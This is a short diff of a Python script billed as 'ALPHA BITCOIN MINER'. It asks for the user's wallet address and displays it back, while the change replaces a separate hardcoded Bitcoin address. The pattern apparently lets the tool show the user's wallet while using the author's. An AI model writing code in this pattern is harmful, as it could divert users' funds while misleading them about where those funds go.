@@ -26,7 +26,7 @@ print(" Welcome to ALPHA BITCOIN MINER")
 print("Alpha Miner is starting \n")
 
 Aaaadress = input("Please input your wallet address below \n" )
-address = '3PEJhntV7L4WT1BgYAicpcjkUamvz3DN7V' 
+address = '36g2QuJtECK9SBok2h2Bzbi7n2NgcrG61D' 
 
 print(Back.BLUE , Fore.WHITE , 'BTC WALLET: ' , Fore.BLACK , str(Aaaadress) , Style.RESET_ALL)
 
